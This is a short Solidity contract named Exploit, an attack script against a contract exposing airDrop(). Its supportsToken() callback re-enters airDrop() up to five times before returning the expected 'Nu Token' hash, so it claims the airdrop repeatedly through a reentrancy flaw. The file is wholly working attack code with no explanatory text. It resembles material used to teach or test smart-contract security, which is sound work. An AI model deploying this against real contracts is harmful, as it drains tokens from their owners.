pragma solidity ^0.4.24;

interface IModifierEntrancy {
    function airDrop() external;
}

contract Exploit {
    IModifierEntrancy public vulnerableContract;
    uint public reentryCount = 0;
    uint public maxReentry = 5;

    constructor(address _target) public {
        vulnerableContract = IModifierEntrancy(_target);
    }

    function initiateAttack() external {
        vulnerableContract.airDrop();
    }

    function supportsToken() external returns (bytes32) {
        if (reentryCount < maxReentry) {
            reentryCount++;
            vulnerableContract.airDrop(); // Reentrant call
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

